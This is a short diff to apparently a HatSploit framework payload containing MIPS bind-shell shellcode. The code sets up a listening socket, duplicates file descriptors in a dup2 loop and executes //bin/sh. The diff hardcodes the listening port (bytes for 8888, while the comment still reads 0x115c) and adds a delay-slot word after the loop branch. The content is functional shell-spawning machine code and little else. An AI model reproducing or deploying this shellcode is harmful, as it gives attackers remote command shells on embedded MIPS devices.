@@ -43,7 +43,7 @@ class HatSploitPayload(Payload):
             b"\x24\x0d\xff\xfd"  # li      t5,-3                         ; t5: -3
             b"\x01\xa0\x68\x27"  # nor     t5,t5,zero                    ; t5: 0x2
             b"\x01\xcd\x68\x04"  # sllv    t5,t5,t6                      ; t5: 0x00020000
-            b"\x24\x0e:bport:port:"  # li      t6,0xFFFF (port)   ; t6: 0x115c (8888 (default BPORT))
+            b"\x24\x0e\x22\xb8"  # li      t6,0xFFFF (port)   ; t6: 0x115c (8888 (default BPORT))
             b"\x01\xae\x68\x25"  # or      t5,t5,t6                      ; t5: 0x0002115c
             b"\xaf\xad\xff\xe0"  # sw      t5,-32(sp)
             b"\xaf\xa0\xff\xe4"  # sw      zero,-28(sp)
@@ -82,6 +82,7 @@ class HatSploitPayload(Payload):
             b"\x24\x10\xff\xff"  # li s0,-1
             b"\x22\x31\xff\xff"  # addi s1,s1,-1
             b"\x16\x30\xff\xfa"  # bne s1,s0 <dup2_loop>
+            b"\x00\x00\x00\x00"
 
             # execve("//bin/sh", ["//bin/sh"], [/* 0 vars */]) = 0
             b"\x28\x06\xff\xff"  # slti a2,zero,-1
